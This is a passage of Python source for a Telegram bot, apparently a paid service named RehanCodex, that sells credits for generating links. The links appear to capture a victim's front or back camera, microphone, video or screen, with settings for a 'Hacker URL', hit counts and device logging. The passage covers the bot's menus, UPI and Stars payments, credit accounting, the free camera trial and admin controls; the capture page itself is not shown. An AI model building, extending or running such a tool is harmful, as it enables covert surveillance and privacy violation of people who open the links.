                await panel(ctx, q, "my_links", wrap("🎯 My Links\n📭 No links created yet.\n✨ Generate your first link.\n👇 Tap Menu to start."), kb_back()); return
            base = TUNNEL["url"] or ("http://localhost:"+str(PORT))
            hdr_lines, url_lines = [], []
            for L in links:
                p = "/c/" if L["feature"]=="custom" else "/t/"
                fl = FEATURES.get(L["feature"], {}).get("label", L["feature"] or "auto")
                hdr_lines.append(fl + " · #" + L["short_id"] + " · " + str(L["hits"]) + " hits")
                url_lines.append(base+p+L["short_id"])
            hdr = "🎯 My Links\n" + "\n".join(hdr_lines) + "\n\n👇 Tap any URL to copy"
            urls_html = "\n".join("<code>"+x+"</code>" for x in url_lines)
            body = "<blockquote>"+bi(hdr)+"</blockquote>\n\n<blockquote>"+urls_html+"</blockquote>\n\n<blockquote>"+BRAND+"</blockquote>"
            await panel(ctx, q, "my_links", body, kb_back()); return

        if d == "u:credit":
            txt = wrap("💸 Credit Center\n💰 Balance: " + str(row["credits"]) + " credit\n🎁 Buy more or check history\n⭐ Stars: 1 Star = 1 credit\n👇 Pick an option below.")
            kb = InlineKeyboardMarkup([
                [B("👛 My Wallet","u:wallet",style="primary"), B("💸 Buy Credit","u:buy",style="success")],
                [B("📜 History","u:history",style="primary"), B("🔙 Back","u:home",style="primary")]])
            await panel(ctx, q, "credit", txt, kb); return

        if d == "u:buy":
            try: minc = int(setting("min_buy_credit", "50"))
            except Exception: minc = 50
            txt = wrap("💳 Buy Credit\n📦 Minimum: " + str(minc) + " credit\n💰 50cr = ₹70 · 1000cr = ₹999\n⚡ Bulk me sasta\n👇 Package ya custom amount")
            rows = []
            for amt in (50, 100, 250, 500, 1000, 2000):
                if amt < minc: continue
                try: price = calc_credit_price(amt)
                except Exception: price = amt
                rows.append([B("💸 " + str(amt) + " cr · ₹" + str(price), "u:pkg:"+str(amt), style="success")])
            rows.append([B("✏️ Custom Amount","u:custom",style="primary")])
            rows.append([B("🔙 Back","u:credit",style="primary")])
            await panel(ctx, q, "credit", txt, InlineKeyboardMarkup(rows)); return

        if d == "u:custom":
            try: minc = int(setting("min_buy_credit", "50"))
            except Exception: minc = 50
            ctx.user_data["await"] = "buy_custom"
            await panel(ctx, q, "credit", wrap("✏️ Custom Amount\n📝 Credit amount bhejo\n💡 Minimum " + str(minc) + " credit\n💰 Rate: ₹1.4/cr small, ₹1/cr bulk"), kb_back("u:buy")); return

        if d.startswith("u:pkg:"):
            try:
                amt = int(d.split(":")[2])
                price = calc_credit_price(amt)
                ctx.user_data["buy"] = {"credit": amt, "price": price}
                txt = wrap("📦 Package Selected\n💰 " + str(amt) + " credit\n💵 ₹" + str(price) + "\n👇 Payment method choose karo")
                rows = [[B("🏦 UPI Payment","u:pay:upi",style="primary")]]
                if setting("stars_on","1") == "1":
                    stars = amt // 1
                    rows.append([B("⭐ Stars (" + str(stars) + ")","u:pay:stars",style="success")])
                rows.append([B("🔙 Back","u:buy",style="primary")])
                await panel(ctx, q, "credit", txt, InlineKeyboardMarkup(rows))
            except Exception as e:
                record_error("u:pkg", e)
                try: await q.answer("Error: " + str(e)[:80], show_alert=True)
                except Exception: pass
            return

        if d == "u:pay:upi":
            try:
                r = ctx.user_data.get("buy") or {}
                if not r:
                    await panel(ctx, q, "credit", wrap("❌ Package missing\n🔄 Try again"), kb_back("u:buy")); return
                upi = setting("upi_id","not set")
                amt = int(r.get("credit",0)); price = int(r.get("price",0))
                caption = ("<blockquote>" + bi("🏦 UPI Payment\n💰 " + str(amt) + " credit\n💵 Pay: ₹" + str(price) + "\n📌 UPI: " + str(upi) + "\n👇 Pay karke screenshot bhejo") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>")
                kb_upi = InlineKeyboardMarkup([
                    [B("✅ I Paid — Send","u:upi_paid",style="success")],
                    [B("🔙 Back","u:buy",style="primary")]])
                qr = setting("upi_qr","")
                if qr:
                    try:
                        try: await q.message.delete()
                        except Exception: pass
                        await ctx.bot.send_photo(q.message.chat_id, qr, caption=caption, parse_mode="HTML", reply_markup=kb_upi)
                        return
                    except Exception as e: record_error("qr send", e)
                await panel(ctx, q, "credit", caption, kb_upi)
            except Exception as e:
                record_error("u:pay:upi", e)
            return

        if d == "u:pay:stars":
            try:
                r = ctx.user_data.get("buy") or {}
                if not r:
                    await panel(ctx, q, "credit", wrap("❌ Package missing"), kb_back("u:buy")); return
                try: minc = int(setting("min_buy_credit", "50"))
                except Exception: minc = 50
                if int(r.get("credit",0)) < minc:
                    try: await q.answer("Minimum " + str(minc) + " credit", show_alert=True)
                    except Exception: pass
                    return
                stars = int(r["credit"]) // 1
                await ctx.bot.send_invoice(
                    chat_id=q.message.chat_id,
                    title=str(r["credit"]) + " RehanCodex Credits",
                    description="Buy " + str(r["credit"]) + " credits for " + str(stars) + " Stars",
                    payload="stars_" + str(u.id) + "_" + str(r["credit"]),
                    provider_token="",
                    currency="XTR",
                    prices=[LabeledPrice(label=str(r["credit"]) + " credits", amount=stars)])
                try: await q.message.delete()
                except Exception: pass
            except Exception as e:
                record_error("u:pay:stars", e)
                try: await q.answer("Stars error: " + str(e)[:80], show_alert=True)
                except Exception: pass
            return

        if d == "u:upi_paid":
            try:
                r = ctx.user_data.get("buy") or {}
                if not r:
                    await panel(ctx, q, "credit", wrap("❌ Restart karo"), kb_back("u:buy")); return
                try: minc = int(setting("min_buy_credit", "50"))
                except Exception: minc = 50
                if int(r.get("credit",0)) < minc:
                    await panel(ctx, q, "credit", wrap("⚠️ Minimum " + str(minc) + " credit\n🔄 Package pick karo"), kb_back("u:buy")); return
                ctx.user_data["await"] = "screenshot"
                await panel(ctx, q, "credit", wrap("📷 Screenshot Bhejo\n"
                    "💰 Package: " + str(r["credit"]) + " credit\n"
                    "💵 ₹" + str(r["price"]) + "\n"
                    "📸 Payment screenshot photo bhejo\n"
                    "⏱️ Admin review karega"), kb_back("u:credit"))
            except Exception as e:
                record_error("u:upi_paid", e)
            return

        if d == "u:wallet":
            try:
                with DB_LOCK:
                    txs = c.execute("SELECT type, amount, note, ts FROM tx WHERE user_id=? ORDER BY id DESC LIMIT 15", (u.id,)).fetchall()
                    spent = c.execute("SELECT COALESCE(SUM(amount),0) FROM tx WHERE user_id=? AND amount<0", (u.id,)).fetchone()[0]
                    bought = c.execute("SELECT COALESCE(SUM(amount),0) FROM tx WHERE user_id=? AND amount>0", (u.id,)).fetchone()[0]
                lines = ["👛 My Wallet",
                         "💰 Balance: " + str(row["credits"]) + " credit",
                         "📈 Total bought: " + str(bought) + " credit",
                         "📉 Total spent: " + str(abs(spent)) + " credit",
                         "",
                         "📜 Recent transactions:"]
                for tx in txs[:10]:
                    t, amt, note, ts = tx["type"], tx["amount"], tx["note"] or "", tx["ts"] or ""
                    sign = "+" if amt > 0 else ""
                    lines.append(sign + str(amt) + " · " + str(t) + " · " + ts[:10])
                if not txs: lines.append("📭 No transactions yet")
                txt = wrap("\n".join(lines))
                kb = InlineKeyboardMarkup([
                    [B("💸 Buy More Credit","u:buy",style="success")],
                    [B("📜 Full History","u:history",style="primary")],
                    [B("🔙 Back","u:credit",style="primary")]])
                await panel(ctx, q, "credit", txt, kb)
            except Exception as e:
                record_error("u:wallet", e)
            return

        if d == "u:history":
            try:
                with DB_LOCK:
                    txs = c.execute("SELECT id, type, amount, note, ts FROM tx WHERE user_id=? ORDER BY id DESC LIMIT 20", (u.id,)).fetchall()
                    total_in = c.execute("SELECT COALESCE(SUM(amount),0) FROM tx WHERE user_id=? AND amount>0", (u.id,)).fetchone()[0]
                    total_out = c.execute("SELECT COALESCE(SUM(amount),0) FROM tx WHERE user_id=? AND amount<0", (u.id,)).fetchone()[0]
                    count = c.execute("SELECT COUNT(*) FROM tx WHERE user_id=?", (u.id,)).fetchone()[0]
                lines = ["📜 Transaction History",
                         "💰 Balance: " + str(row["credits"]) + " credit",
                         "📈 Total earned: " + str(total_in),
                         "📉 Total spent: " + str(abs(total_out)),
                         "🔢 Total entries: " + str(count),
                         ""]
                if txs:
                    lines.append("━━ Recent 20 ━━")
                    for t in txs:
                        amt = t["amount"]; typ = t["type"]; note = t["note"] or ""; ts = (t["ts"] or "")[:16]
                        sign = "+" if amt > 0 else ""
                        emoji = "💚" if amt > 0 else "❤️"
                        line = emoji + " " + sign + str(amt) + " · " + str(typ)
                        if note: line += " · " + str(note)[:24]
                        line += "\n   🕐 " + ts
                        lines.append(line)
                else:
                    lines.append("📭 No transactions yet")
                txt = wrap("\n".join(lines))
                kb = InlineKeyboardMarkup([
                    [B("💸 Buy Credit","u:buy",style="success")],
                    [B("👛 Wallet","u:wallet",style="primary")],
                    [B("🔙 Menu","u:home",style="primary")]])
                await panel(ctx, q, "my_stats", txt, kb)
            except Exception as e:
                record_error("u:history", e)
            return

        if d == "u:readme":
            try:
                mc = setting("min_buy_credit", "50")
                mp = setting("min_buy_price", "50")
                txt = wrap("📖 Read Me — Rules\n🔒 Credit buy karna zaroori hai bot use karne ke liye\n💰 Minimum buy: " + str(mc) + " credit = " + str(mp) + " rs\n⚡ Har feature ka apna cost hai\n🎁 Daily 1 free use per feature\n⏱️ 30 din me credit na kharida toh access hat jayega\n👇 Buy credit from Credit panel")
                kb_rm = InlineKeyboardMarkup([
                    [B("💸 Buy Credit","u:buy",style="success")],
                    [B("💬 BUY ACCESS", url="https://t.me/RehanCodex", style="primary")],
                    [B("🔙 Menu","u:home",style="primary")]])
                await panel(ctx, q, "support", txt, kb_rm)
            except Exception as e:
                record_error("u:readme", e)
            return

        if d == "u:stats":
            with DB_LOCK:
                nl = c.execute("SELECT COUNT(*) FROM links WHERE owner=?", (u.id,)).fetchone()[0]
                hc = c.execute("SELECT COALESCE(SUM(hits),0) FROM links WHERE owner=?", (u.id,)).fetchone()[0]
            hdr = "📊 My Stats\n🔗 Links created: " + str(nl) + "\n🎯 Total clicks: " + str(hc) + "\n💸 Balance: " + str(row["credits"]) + " credit\n✨ Keep sharing."
            await panel(ctx, q, "my_stats", wrap(hdr), kb_back()); return

        if d == "u:sup":
            txt = wrap("💬 Support Center\n👨‍💻 DM @RehanCodex directly\n📩 Better reply in DM only\n⚠️ Bot chat me reply nahi milega\n👇 Tap button to open DM")
            kb = InlineKeyboardMarkup([
                [B("💬 DM @RehanCodex", url="https://t.me/RehanCodex", style="success")],
                [B("🔙 Back","u:home",style="primary")]])
            await panel(ctx, q, "support", txt, kb); return

        if d == "u:ref":
            await panel(ctx, q, "user_panel", wrap("❌ Referral unavailable\n🔒 Feature removed\n💬 Contact @RehanCodex"), kb_back("u:home")); return

        log("!! unhandled u: cb: " + d)
        try: await q.answer("Menu refresh karo", show_alert=False)
        except Exception: pass

    except Exception as e:
        record_error("user_cb", e)
        try: await q.answer("Error: " + str(e)[:80], show_alert=True)
        except Exception: pass


def active_link_remaining(uid, mode=None):
    try:
        with DB_LOCK:
            if mode:
                L = c.execute("SELECT * FROM links WHERE owner=? AND active=1 AND dest=? ORDER BY id DESC LIMIT 1",
                              (uid, mode)).fetchone()
            else:
                L = c.execute("SELECT * FROM links WHERE owner=? AND active=1 ORDER BY id DESC LIMIT 1",
                              (uid,)).fetchone()
        if not L: return None
        if is_expired(L):
            with DB_LOCK:
                c.execute("UPDATE links SET active=0 WHERE id=?", (L["id"],))
                conn.commit()
            return None
        try: ttl = int(setting("link_ttl", DEFAULT_TTL))
        except Exception: ttl = DEFAULT_TTL
        if ttl <= 0: return L, 999999
        try:
            created = datetime.strptime(L["created"], "%Y-%m-%d %H:%M:%S")
            remain = ttl - int((datetime.utcnow() - created).total_seconds())
        except Exception: remain = ttl
        if remain < 0: remain = 0
        return L, remain
    except Exception as e:
        record_error("active_link_remaining", e)
        return None


async def user_gen(q, ctx, u, feat):
    try:
        is_trial = (not is_allowed(u.id)) and feat == "camera"
        if is_trial:
            log("trial camera for " + str(u.id) + " — FREE")
        row = get_user(u.id)
        if feat not in FEATURES:
            log("user_gen: unknown feat " + str(feat))
            return

        # FIX I: trial mark deferred to _do_gen after link commits
        if not is_allowed(u.id):
            if feat != "camera":
                await panel(ctx, q, "new_link",
                    _restricted_message(), _restricted_kb(with_back=True))
                return
            _, _week_expired, _days_left = trial_week_status(u.id)
            _trial_used = setting("camera_trial_" + str(u.id), "") == "1"
            if _trial_used or _week_expired:
                await panel(ctx, q, "new_link", _restricted_message(), _restricted_kb(with_back=True))
                return
            log("camera trial ready for: " + str(u.id))

        if is_allowed(u.id):
            r = active_link_remaining(u.id, feat)
            if r:
                L, remain = r
                base = TUNNEL["url"] or ("http://localhost:"+str(PORT))
                url = base + "/t/" + L["short_id"]
                body = "<blockquote>" + bi("⚠️ Active link running\n⏰ Expires in: " + str(remain) + "s\n🎯 Wait for expiry") + "</blockquote>\n\n<blockquote><code>" + url + "</code></blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"
                await panel(ctx, q, "new_link", body, kb_back("u:home"))
                return

        row = get_user(u.id)
        is_demo = False
        try:
            today = datetime.utcnow().strftime("%Y-%m-%d")
            used_key = "daily_" + str(u.id) + "_" + feat
            if setting(used_key, "") != today:
                is_demo = True
        except Exception: pass

        # FIX A: clean cost computation
        is_trial = (not is_allowed(u.id)) and feat == "camera"
        if is_trial:
            cost = 0
        elif is_demo:
            cost = 0
        else:
            cost = feature_cost(feat)

        if not is_trial and not is_demo and row["credits"] < cost:
            await panel(ctx, q, "new_link", wrap("💸 Not enough credit\n🎯 Required: " + str(cost) + " credit\n💰 Your balance: " + str(row["credits"]) + " credit\n🎁 Top up karo"), kb_back("u:home"))
            return
        if not TUNNEL["url"]:
            await panel(ctx, q, "new_link", wrap("⚠️ Server Down\n"
                "🔧 Tunnel temporarily unavailable\n"
                "📞 Contact @RehanCodex\n"
                "💰 Credit safe hai\n"
                "✨ Try again shortly"), kb_back())
            return

        if FEATURES.get(feat, {}).get("facing"):
            if is_trial:
                cost_line = "🎁 FREE trial — 1 time, non-whitelisted"
            elif is_demo:
                cost_line = "🎁 FREE today (daily) — whitelisted"
            else:
                cost_line = "💰 Cost: " + str(cost) + " credit"
            txt = wrap("🎬 " + FEATURES[feat]["label"] + "\n" + cost_line + "\n📸 Select camera facing\n👇 Pick one to continue.")
            kb = InlineKeyboardMarkup([
                [B("📷 Front Camera", "u:gen:" + feat + ":user", style="success")],
                [B("📹 Back Camera", "u:gen:" + feat + ":environment", style="primary")],
                [B("🔙 Back", "u:home", style="primary")]])
            await panel(ctx, q, "new_link", txt, kb)
            return

        await _do_gen(q, ctx, u, feat, cost, "user")
    except Exception as e:
        record_error("user_gen", e)
        try: await q.answer("Error: " + str(e)[:80], show_alert=True)
        except Exception: pass


async def _do_gen(q, ctx, u, feat, cost, facing):
    log(f"_do_gen START: uid={u.id} feat={feat} cost={cost} facing={facing}")
    link_url = None
    sid = None
    deducted = False
    try:
        tunnel_url = TUNNEL.get("url")
        if not tunnel_url:
            log("_do_gen: no tunnel URL")
            await panel(ctx, q, "new_link",
                wrap("⚠️ Server Down\n🔧 Tunnel temporarily unavailable\n📞 Contact @RehanCodex\n💰 Credit safe hai\n✨ Try again shortly"),
                kb_back("u:home"))
            return
        log(f"_do_gen: tunnel={tunnel_url[:40]}")

        row = get_user(u.id)
        if not row:
            log("_do_gen: no user row")
            await panel(ctx, q, "new_link", wrap("❌ User data missing\n🔄 Try /start again"), kb_back())
            return

        if cost > 0 and row["credits"] < cost:
            log(f"_do_gen: not enough credit {row['credits']} < {cost}")
            await panel(ctx, q, "new_link",
                wrap(f"💸 Not enough credit\n🎯 Required: {cost} credit\n💰 Balance: {row['credits']}\n🎁 Top up karo"),
                kb_back("u:credit"))
            return

        sid = gen_id()
        log(f"_do_gen: sid={sid}")

        try:
            with DB_LOCK:
                if cost > 0:
                    c.execute("UPDATE users SET credits=credits-? WHERE id=?", (cost, u.id))
                    c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                              (u.id, "feature", -cost, f"link {sid}", now()))
                    deducted = True
                c.execute("INSERT INTO links(short_id,owner,feature,dest,hits,devices,created,active,camera_facing) VALUES(?,?,?,?,0,'',?,1,?)",
                          (sid, u.id, feat, "", now(), facing))
                conn.commit()
            log(f"_do_gen: DB ok, deducted={deducted}")
        except Exception as e:
            log(f"_do_gen DB FAIL: {e}")
            if deducted:
                try: refund_credit(u.id, cost, "link_db_fail")
                except Exception: pass
            await panel(ctx, q, "new_link", wrap("❌ Database error\n💰 Credit refunded\n🔄 Try again"), kb_back())
            return

        # FIX G: mark trial / daily
        try:
            if feat == "camera" and (not is_allowed(u.id)) and cost == 0:
                set_setting("camera_trial_" + str(u.id), "1")
                log(f"_do_gen: trial marked for {u.id}")
            elif cost == 0 and is_allowed(u.id):
                today = datetime.utcnow().strftime("%Y-%m-%d")
                set_setting("daily_" + str(u.id) + "_" + feat, today)
                log(f"_do_gen: daily marked for {u.id}/{feat}")
        except Exception as e:
            log(f"_do_gen mark fail: {e}")

        link_url = tunnel_url + "/t/" + sid
        if feat == "combo":
            lbl = COMBO_LABEL
        else:
            lbl = FEATURES.get(feat, {}).get("label", feat)

        try:
            ttl = int(setting("link_ttl", DEFAULT_TTL))
            ttl_txt = (str(ttl // 60) + " min") if ttl >= 60 else (str(ttl) + "s" if ttl > 0 else "never")
        except Exception:
            ttl_txt = "5 min"

        if cost == 0:
            if not is_allowed(u.id):
                cost_lbl = "🎁 FREE trial (1 time)"
            else:
                cost_lbl = "🎁 FREE today (daily)"
        else:
            cost_lbl = f"💸 {cost} credit"
        hdr = (f"✅ Your new link is ready\n"
               f"🎬 Feature: {lbl}\n"
               f"💳 Cost: {cost_lbl}\n"
               f"⏰ Expires in: {ttl_txt}\n"
               f"📋 Tap URL below to copy")
        txt = wrap_url(hdr, link_url)
        log(f"_do_gen: url built")

        try:
            if q.message:
                await q.message.delete()
                log("_do_gen: old msg deleted")
        except Exception as e:
            log(f"_do_gen delete warn: {str(e)[:80]}")

        kb_link = InlineKeyboardMarkup([[B("🔙 Menu", "u:home", style="primary")]])
        try:
            await ctx.bot.send_message(q.message.chat_id, txt, parse_mode="HTML", reply_markup=kb_link)
            log("_do_gen: link sent to user")
        except Exception as e:
            log(f"_do_gen send FAIL: {str(e)[:150]}")
            if deducted:
                try: refund_credit(u.id, cost, "link_send_fail")
                except Exception: pass
            try:
                await ctx.bot.send_message(q.message.chat_id,
                    wrap(f"❌ Link delivery failed\n💰 Credit refunded: {cost}\n🔄 Try again /rehancodex"),
                    parse_mode="HTML")
            except Exception: pass
            return

        try:
            uname = "@" + u.username if u.username else "id " + str(u.id)
            threading.Thread(
                target=notify_admin,
                args=(f"🔗 New link\n👤 {uname}\n🎬 {lbl}\n🆔 #{sid}\n⏰ {ttl_txt}\n{link_url}",),
                daemon=True).start()
        except Exception as e:
            log(f"_do_gen admin notify fail: {str(e)[:80]}")

        log(f"_do_gen DONE: sid={sid}")

    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        log(f"_do_gen OUTER FAIL: {str(e)[:200]}")
        log(tb[:800])
        record_error("_do_gen", e)
        if deducted and cost > 0:
            try: refund_credit(u.id, cost, "_do_gen_fail")
            except Exception: pass
        try:
            await ctx.bot.send_message(q.message.chat_id,
                wrap(f"❌ Link generate fail\n💰 Credit refunded: {cost}\n🔄 Try again"),
                parse_mode="HTML")
        except Exception: pass


# ═══════════ ADMIN CALLBACKS ═══════════
async def admin_cb(q, ctx, d):
    try:
        if d == "a:home":
            u,a,l,k,p = counts()
            maint = "🚧 ON" if is_maintenance() else "✅ OFF"
            txt = wrap("🜲 ADMIN CONTROL PANEL\n👥 Users: " + str(u) + " · 🌟 Active: " + str(a) + "\n🔗 Links today: " + str(l) + " · 🎯 Clicks: " + str(k) + "\n💳 Payments: " + str(p) + " · 🚧 Maint: " + maint + "\n👇 Tap any button to manage.")
            await panel(ctx, q, "admin_panel", txt, kb_admin())
        elif d == "a:users":
            with DB_LOCK:
                t = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
                b = c.execute("SELECT COUNT(*) FROM users WHERE banned=1").fetchone()[0]
            txt = wrap("👥 User Management\n📊 Total: " + str(t) + " · 🚫 Banned: " + str(b) + "\n🌟 Active: " + str(t-b) + "\n🔍 Search by ID or @username\n🎯 Ban / Unban / Delete below.")
            await panel(ctx, q, "users", txt,
                InlineKeyboardMarkup([
                    [B("🔍 Search","a:user_search",style="primary")],
                    [B("🚫 Ban","a:ban",style="danger"), B("✅ Unban","a:unban",style="success")],
                    [B("🗑 Delete","a:delete",style="danger")],
                    [B("🔙 Back","a:home",style="primary")]]))
        elif d == "a:user_search":
            ctx.user_data["await"] = "adm_search"
            await panel(ctx, q, "users", wrap("🔍 Search user\n📝 Send user ID or @username\n🎯 Full details shown on match."), kb_back("a:users"))
        elif d == "a:ban":
            ctx.user_data["await"] = "adm_ban"
            await panel(ctx, q, "users", wrap("🚫 Ban user\n📝 Send ID or @username\n🔒 User loses access instantly."), kb_back("a:users"))
        elif d == "a:unban":
            ctx.user_data["await"] = "adm_unban"
            await panel(ctx, q, "users", wrap("✅ Unban user\n📝 Send ID or @username\n🌟 User regains access."), kb_back("a:users"))
        elif d == "a:delete":
            ctx.user_data["await"] = "adm_delete"
            await panel(ctx, q, "users", wrap("🗑 Delete user\n⚠️ Permanent — cannot be undone\n📝 Send ID or @username\n🚨 All data wiped."), kb_back("a:users"))
        elif d == "a:help":
            help_text = (
                "📖 ADMIN COMMAND HELP\n"
                "\n"
                "🔐 WHITELIST COMMANDS\n"
                "/add user_id — grant access\n"
                "/remove user_id — revoke access\n"
                "/users — list all whitelisted\n"
                "\n"
                "💸 CREDIT COMMANDS\n"
                "/addcredit user_id amount msg\n"
                "/removecredit user_id amount msg\n"
                "/addcreditall amount msg\n"
                "/removecreditall amount msg\n"
                "\n"
                "🔗 LINK OWNER\n"
                "/linkowner user_id\n"
                "\n"
                "🆔 USER INFO\n"
                "/id — your id + username\n"
                "\n"
                "🛡️ ADMIN PANEL\n"
                "/rehanroshni — admin panel\n"
                "/rehancodex — user panel\n"
                "/start — user panel\n"
                "\n"
                "🐞 ERROR MGMT\n"
                "/logs — recent errors\n"
                "/clearerr — clear log\n"
                "\n"
                "🎛️ PANEL BUTTONS\n"
                "👥 Users · 💸 Add Credit · 💎 Feature Rates\n"
                "👥 Whitelist · 🛠️ Settings · 🔐 Access Config\n"
                "🚪 Force Join · 💳 Payment · 🎨 Banners\n"
                "📢 Broadcast · ⚙️ Mode · 🚧 Maintenance\n"
                "🔧 System"
            )
            kb = InlineKeyboardMarkup([
                [B("👥 Whitelist","a:wl",style="primary"), B("💸 Add Credit","a:add_credit",style="success")],
                [B("🛠️ Settings","a:settings",style="success"), B("🔐 Access","a:access_cfg",style="primary")],
                [B("🔙 Back","a:home",style="primary")]])
            await panel(ctx, q, "sys_panel", wrap(help_text), kb)
        elif d == "a:settings":
            ttl = setting("link_ttl", DEFAULT_TTL)
            mic = setting("mic_secs", DEFAULT_MIC_SECS)
            vs = setting("video_secs", DEFAULT_VIDEO_SECS)
            hacker = setting("hacker_url", DEFAULT_HACKER_URL)
            upi = setting("upi_id", "not set")
            app = setting("access_price", "100")
            ad = setting("access_days", "30")
            mc = setting("min_buy_credit", "50")
            mp = setting("min_buy_price", "50")
            fd = setting("free_daily", "1")
            fc = feature_cost("camera")
            mo = setting("max_opens", DEFAULT_MAX_OPENS)
            txt = wrap("🛠️ Settings Panel\n"
                       "🕐 TTL: " + str(ttl) + "s · 🔢 Max Opens: " + str(mo) + "\n"
                       "🎙️ Mic: " + str(mic) + "s · 🎥 Video: " + str(vs) + "s\n"
                       "💰 Access: " + str(app) + "rs · ⏱️ Days: " + str(ad) + "\n"
                       "📦 Min buy: " + str(mc) + "cr = " + str(mp) + "rs\n"
                       "🎁 Daily: " + str(fd) + " · 🎬 Cam: " + str(fc) + "\n"
                       "🏦 UPI: " + str(upi)[:20] + "\n"
                       "👇 Tap any option to edit")
            kb = InlineKeyboardMarkup([
                [B("🕐 TTL","a:set_ttl",style="primary"), B("🎙️ Mic Secs","a:set_mic",style="primary")],
                [B("🎥 Video Secs","a:set_vsec",style="primary"), B("🖥️ Screen Secs","a:set_scrsec",style="primary")],
                [B("🎯 Hacker URL","a:set_hacker",style="primary")],
                [B("🏦 UPI ID","a:upi",style="primary"), B("📸 UPI QR","a:upi_qr",style="primary")],
                [B("💰 Access Price","a:ac_price",style="primary")],
                [B("⏱️ Access Days","a:ac_days",style="primary"), B("📦 Min Credit","a:ac_mc",style="primary")],
                [B("💵 Min Price","a:ac_mp",style="primary"), B("🎁 Daily Limit","a:ac_fd",style="primary")],
                [B("💎 Feature Rates","a:rates",style="success")],
                [B("🔄 Notify Update","a:notify_all",style="success")],
                [B("🔙 Back","a:home",style="primary")]])
            await panel(ctx, q, "sys_panel", txt, kb)
        elif d == "a:lo_reward":
            cur = setting("linkowner_reward", "20")
            ctx.user_data["await"] = "adm_lo_reward"
            await panel(ctx, q, "sys_panel", wrap("🔗 Linkowner Reward\n📌 Current: " + str(cur) + " credit\n📝 Send new reward amount\n💡 Example: 20"), kb_back("a:settings"))
        elif d == "a:notify_all":
            ctx.user_data["await"] = "adm_notify_msg"
            await panel(ctx, q, "sys_panel", wrap("🔄 Notify All Users\n📝 Send update message\n💡 Example: New rates live"), kb_back("a:settings"))
        elif d == "a:access_cfg":
            ap = setting("access_price", "100")
            ad = setting("access_days", "30")
            mc = setting("min_buy_credit", "50")
            mp = setting("min_buy_price", "50")
            fd = setting("free_daily", "1")
            txt = wrap("🔐 Access Config\n"
                       "💰 Access price: " + str(ap) + " rs\n"
                       "⏱️ Validity: " + str(ad) + " days\n"
                       "📦 Min buy: " + str(mc) + " credit = " + str(mp) + " rs\n"
                       "🎁 Daily free: " + str(fd) + " per feature\n"
                       "👇 Tap to edit")
            kb = InlineKeyboardMarkup([
                [B("💰 Access Price","a:ac_price",style="primary")],
                [B("⏱️ Validity Days","a:ac_days",style="primary")],
                [B("📦 Min Credit","a:ac_mc",style="primary")],
                [B("💵 Min Price","a:ac_mp",style="primary")],
                [B("🎁 Daily Limit","a:ac_fd",style="primary")],
                [B("🔙 Back","a:home",style="primary")]])
            await panel(ctx, q, "sys_panel", txt, kb)
        elif d == "a:upi_qr":
            cur = setting("upi_qr","")
            ctx.user_data["await"] = "adm_upi_qr"
            await panel(ctx, q, "sys_panel", wrap("📸 UPI QR Banner\n"
                "📌 Current: " + ("Set ✅" if cur else "Not set ⬜") + "\n"
                "📝 Send QR image as photo\n"
                "💡 Type 'clear' to remove"), kb_back("a:settings"))
        elif d == "a:ac_price":
            ctx.user_data["await"] = "adm_ac_price"
            await panel(ctx, q, "sys_panel", wrap("💰 Access Price\n📝 Send rupees (integer)\n💡 Example: 100"), kb_back("a:access_cfg"))
        elif d == "a:ac_days":
            ctx.user_data["await"] = "adm_ac_days"
            await panel(ctx, q, "sys_panel", wrap("⏱️ Access Validity\n📝 Send days (integer)\n💡 Example: 30"), kb_back("a:access_cfg"))
        elif d == "a:ac_mc":
            ctx.user_data["await"] = "adm_ac_mc"
            await panel(ctx, q, "sys_panel", wrap("📦 Minimum Buy Credit\n📝 Send integer\n💡 Example: 50"), kb_back("a:access_cfg"))
        elif d == "a:ac_mp":
            ctx.user_data["await"] = "adm_ac_mp"
            await panel(ctx, q, "sys_panel", wrap("💵 Minimum Buy Price\n📝 Send rupees\n💡 Example: 50"), kb_back("a:access_cfg"))
        elif d == "a:ac_fd":
            ctx.user_data["await"] = "adm_ac_fd"
            await panel(ctx, q, "sys_panel", wrap("🎁 Daily Free Uses\n📝 Send integer per feature\n💡 Example: 1"), kb_back("a:access_cfg"))
        elif d == "a:add_credit":
            ctx.user_data["await"] = "adm_addc"
            await panel(ctx, q, "users", wrap("💸 Add Credit to User\n📝 Format: user_id amount\n💡 Example: 123456789 50"), kb_back("a:home"))
        elif d == "a:stats":
            u,a,l,k,p = counts()
            txt = wrap("📊 Statistics Overview\n👥 Users: " + str(u) + " · 🌟 Active: " + str(a) + "\n🔗 Links today: " + str(l) + "\n🎯 Clicks today: " + str(k) + "\n💳 Payments: " + str(p) + "\n🐞 Errors: " + str(len(ERROR_LOG)))
            await panel(ctx, q, "stats", txt, kb_back())
        elif d == "a:rates":
            lines = ["💎 Feature Rates", "💡 Tap a feature to edit cost", ""]
            btns = []
            for k, meta in FEATURES.items():
                lines.append(meta["label"] + " · " + str(feature_cost(k)) + " cr")
                btns.append([B(meta["label"] + " · " + str(feature_cost(k)) + " cr", "a:rate:"+k, style="primary")])
            btns.append([B("🔙 Back","a:home",style="primary")])
            await panel(ctx, q, "rates", wrap("\n".join(lines)), InlineKeyboardMarkup(btns))
        elif d.startswith("a:rate:"):
            feat = d.split(":",2)[2]
            lbl = COMBO_LABEL if feat == COMBO else FEATURES.get(feat, {}).get("label", feat)
            cur = feature_cost(feat)
            ctx.user_data["rate_feat"] = feat; ctx.user_data["await"] = "adm_rate_edit"
            await panel(ctx, q, "rates", wrap("💎 Edit Rate — " + lbl + "\n📌 Current: " + str(cur) + " credit\n📝 Send new cost (integer)"), kb_back("a:rates"))
        elif d == "a:wl":
            rows = list_allowed()
            lines = ["👥 Whitelist · " + str(len(rows)) + " users",
                     "📝 /add <id> · /remove <id>", ""]
            for uid, uname, cred, banned in rows[:15]:
                mark = "🚫" if banned else "🌟"
                lines.append(mark + " @" + (uname or "-") + " · " + str(uid))
            if not rows: lines.append("📭 No users yet")
            btns = [[B("➕ Add User","a:wl_add",style="success")],
                    [B("➖ Remove User","a:wl_rm",style="danger")],
                    [B("🔙 Back","a:home",style="primary")]]
            await panel(ctx, q, "users", wrap("\n".join(lines)), InlineKeyboardMarkup(btns))
        elif d == "a:wl_add":
            ctx.user_data["await"] = "adm_wl_add"
